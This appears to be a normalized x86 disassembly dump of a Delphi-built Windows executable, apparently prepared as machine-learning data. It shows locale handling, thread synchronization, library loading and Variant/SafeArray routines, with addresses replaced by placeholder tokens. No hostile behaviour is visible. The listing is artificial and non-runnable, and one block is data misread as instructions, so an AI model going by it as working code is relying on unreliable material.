call sub_409140
mov edi eax
test edi edi
jne r-xdata
sub_40cd10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40cd74
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404694
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408b2c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cd7b
lea eax [ ebp - 0xc ]
call sub_40442c
retn
sub_40cd84
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40cd10
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40cdfc
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40cde4
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40cd84
pop ecx
push ebp
call sub_40cd84
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_4031f4
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40cf70
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40d23b
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40cdfc
call sub_40b8a8
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b7f8
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_404480
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b7f8
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408b2c
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b7f8
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408b2c
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b844
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b844
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b7f8
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408b2c
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b844
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b7f8
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40bb30
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_404480
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b7f8
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40bb30
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_404480
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b844
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b7f8
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_404480
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b7f8
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_404480
lea eax [ ebp - 0x8 ]
call sub_40442c
lea eax [ ebp - 0xc ]
call sub_40442c
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b7f8
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408b2c
test eax eax
jne r-xdata
call sub_40ba80
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4044c4
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4044c4
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4047a4
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4047a4
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b844
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d242
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_404450
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b7f8
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408b2c
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b7f8
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408b2c
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4044c4
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4044c4
jmp r-xdata
sub_40d2f0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40d380
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b7ac
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d387
lea eax [ ebp - 0x14 ]
call sub_40442c
retn
sub_40d3d8
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax r-xdata
mov [ rw-data ] eax
sub_40d45c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
mov [ esi + 0x4c ] 0xea60
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_40d498
push ebx
push esi
push edi
push ebp
call sub_403a8c
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_402764
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov ebp [ edi + 0x44 ]
xor eax eax
mov [ edi + 0x44 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4036b0
test bl bl
jle r-xdata
mov eax ebp
mov ebp [ ebp + 0x4 ]
call sub_402764
test ebp ebp
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403a74
sub_40d518
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
lea eax [ edi + 0x48 ]
call sub_40d434
mov eax edi
call sub_40d500
mov ebx eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
call GetCurrentThreadId
mov esi eax
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d68c
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov [ ebp + 0x8 ] esi
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40d44c
mov [ ebp ] eax
mov eax 0x10
call sub_40859c
mov ebp eax
sub_40d590
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
lea eax [ esi + 0x44 ]
xor edx edx
call sub_40d44c
mov [ esp + 0x4 ] eax
lea eax [ esi + 0x48 ]
call sub_40d440
test eax eax
jne r-xdata
mov edx [ esp + 0x4 ]
mov eax esi
call sub_40d660
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0x4 ]
lea ebp [ esp + 0x4 ]
call GetTickCount
mov edi eax
test ebx ebx
je r-xdata
mov eax ebx
mov ebx [ ebx + 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp edi [ eax + 0xc ]
jb r-xdata
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edi
jmp r-xdata
call sub_402764
mov [ ebp ] ebx
jmp r-xdata
mov edx edi
sub edx [ eax + 0xc ]
cmp edx [ esi + 0x4c ]
jbe r-xdata
lea ebp [ eax + 0x4 ]
test ebx ebx
jne r-xdata
sub_40d618
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_40d500
and eax 0xff
lea eax [ esi + eax * 4 + 0x4 ]
jmp r-xdata
mov edx [ eax ]
test edx edx
je r-xdata
mov edx [ ebx ]
mov edx [ edx ]
call sub_40d44c
mov eax [ ebx ]
mov edx [ ebx ]
mov [ edx + 0x4 ] eax
mov edx [ ebx ]
lea eax [ esi + 0x44 ]
call sub_40d44c
mov edx [ ebx ]
mov [ edx + 0x4 ] eax
pop esi
pop ebx
retn
cmp edx [ ebx ]
jne r-xdata
mov eax edx
sub_40d660
push ebx
push esi
push edi
mov esi edx
mov edi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov ebx eax
mov [ ebx + 0x4 ] esi
lea eax [ edi + 0x44 ]
mov edx esi
call sub_40d44c
mov [ ebx + 0x4 ] eax
sub_40d68c
push ebx
push esi
push edi
mov edi eax
lea eax [ edi + 0x44 ]
xor edx edx
call sub_40d44c
mov esi eax
mov ebx esi
mov eax esi
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax edi
call sub_40d660
mov eax ebx
pop edi
pop esi
pop ebx
retn
cmp esi ebx
jne r-xdata
mov eax ebx
mov ebx [ ebx + 0x4 ]
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov esi [ ebx + 0x4 ]
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x10
call sub_402fc4
sub_40d6e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d45c
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_40d758
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_40d7e4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_4036c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_40d7e4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x4 ] eax
mov bl 0x1
call GetCurrentThreadId
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x1c ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40d7a0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_40d518
xor eax eax
push ebp
push sub_40d86c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
seta [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_40d590
retn
mov eax [ ebp - 0x4 ]
add eax 0xc
call sub_40d434
sub_40d8e4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_40d518
xor eax eax
push ebp
push sub_40d97a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
dec [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24 ] edx
mov eax [ ebp - 0x4 ]
add eax 0xc
mov edx 0xffff
call sub_40d454
mov eax [ ebp - 0x4 ]
call sub_40d7b8
push 0x0
call Sleep
mov eax [ ebp - 0x4 ]
call sub_40d7ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d981
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_40d590
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_40d618
sub_40d988
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
xor ebx ebx
call GetCurrentThreadId
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x24 ]
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_40d518
xor eax eax
push ebp
push sub_40da1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
seta al
test al bl
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da25
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_40d590
retn
mov eax [ ebp - 0x4 ]
add eax 0xc
call sub_40d434
mov eax [ ebp - 0x4 ]
add eax 0xc
call sub_40d440
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xc
call sub_40d434
mov eax [ ebp - 0x4 ]
call sub_40d7c4
mov bl 0x1
sub_40da2c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_40d518
xor eax eax
push ebp
push sub_40dab1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dab8
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_40d590
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_40d618
call GetCurrentThreadId
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x24 ]
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xc
call sub_40d434
cmp eax 0xffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d7b8
sub_40dacc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40daf0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40db67
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_406194
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403774
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db6e
lea eax [ ebp - 0x4 ]
call sub_406194
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403774
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40dacc
test al al
jne r-xdata
mov al 0x1
sub_40db88
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40dbfa
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40dbdc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4048dc
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dbe3
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40dc0c
sbb eax 0xe8000000
bound ecx [ eax ]
movsb [ edi ] [ esi ]
salc
dec eax
add al ah
bound ecx [ eax ]
rcl ch 0x1
dec eax
add al bl
bound ecx [ eax ]
push eax
aam 0x48
add al dl
bound ecx [ eax ]
hlt
sub_40e05c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e0c4
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e0cb
retn
mov eax sub_40dc0c
call sub_4041d8
mov eax r-xdata
call sub_404200
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c65c
call sub_40c74c
call sub_40d3d8
call sub_40cf70
mov eax rw-data
mov edx r-xdata
call sub_404480
sub_40e13c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e161
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e168
retn
sub_40e2b0
push ebx
push esi
push ecx
mov esi eax
mov bx [ esi ]
and bx 0xfff
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_411fd4
test al al
je r-xdata
test [ esi + 0x1 ] 0x40
jne r-xdata
call sub_40e2a0
mov edx esi
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp bx 0x8
jae r-xdata
pop edx
pop esi
pop ebx
retn
cmp bx 0x100
jne r-xdata
cmp bx 0x101
jne r-xdata
mov [ esi ] 0x0
lea eax [ esi + 0x8 ]
call sub_40442c
jmp r-xdata
push esi
call VariantClear
jmp r-xdata
mov eax esi
call [ rw-data ]
jmp r-xdata
sub_40e328
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov bx [ edi ]
and bx 0xfff
test esi esi
je r-xdata
cmp bx 0x10f
jae r-xdata
mov eax esi
call sub_40e2b0
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_411fd4
test al al
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
add esp 0x10
jmp r-xdata
call sub_40e2a0
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40e394
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jne r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e394
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e3f0
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov [ ebp - 0x304 ] eax
mov ax [ edx ]
mov ecx eax
and cx 0xfff
cmp cx 0xc
je r-xdata
test ah 0x40
je r-xdata
push edx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
jmp r-xdata
mov eax [ edx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ edx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40e2b0
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov al 0x12
call sub_4028a0
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
test eax eax
je r-xdata
mov al 0x14
call sub_4028a0
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
test eax eax
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
mov al 0x14
call sub_4028a0
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
test eax eax
je r-xdata
mov al 0x14
call sub_4028a0
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
test eax eax
je r-xdata
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
push ebp
mov eax [ ebp - 0x310 ]
dec eax
call sub_40e394
pop ecx
test al al
jne r-xdata
mov al 0x14
call sub_4028a0
sub_40e5c4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov edi edx
mov esi eax
cmp esi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov bp [ edi ]
and bp 0xfff
mov eax esi
call sub_40e2b0
cmp bp 0x10f
jae r-xdata
mov edx esp
mov eax ebp
call sub_411fd4
test al al
je r-xdata
cmp bp 0x8
jae r-xdata
call sub_40e2a0
push ebx
mov ecx edi
mov edx esi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub bp 0x14
je r-xdata
mov eax edi
mov edi esi
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov [ esi ] 0x14
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
sub bp 0xec
je r-xdata
mov [ esi ] 0x100
xor eax eax
mov [ esi + 0x8 ] eax
lea eax [ esi + 0x8 ]
mov edx [ edi + 0x8 ]
call sub_404480
jmp r-xdata
dec bp
je r-xdata
push esi
mov eax edi
mov edi esi
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
test bl bl
je r-xdata
mov ax [ edi ]
test ah 0x20
je r-xdata
test [ edi + 0x1 ] 0x20
je r-xdata
push edi
push esi
call VariantCopy
jmp r-xdata
test ah 0x40
jne r-xdata
push edi
push esi
call VariantCopyInd
test eax eax
je r-xdata
mov ecx sub_40e5b0
mov edx edi
mov eax esi
call sub_40e3f0
jmp r-xdata
mov ecx sub_40e5b0
mov edx edi
mov eax esi
call sub_40e3f0
jmp r-xdata
call sub_40e2a0
sub_40e6ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e874
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ esi ]
and ax 0xfff
movzx eax ax
cmp eax 0x14
ja r-xdata
call sub_40e298
jmp [ eax * 4 + jump_table_40e722 ]
movsx eax [ esi + 0x8 ]
cdq
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
jmp r-xdata
mov eax [ esi + 0x8 ]
cdq
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
jmp r-xdata
fld [ esi + 0x8 ]
call sub_402ab8
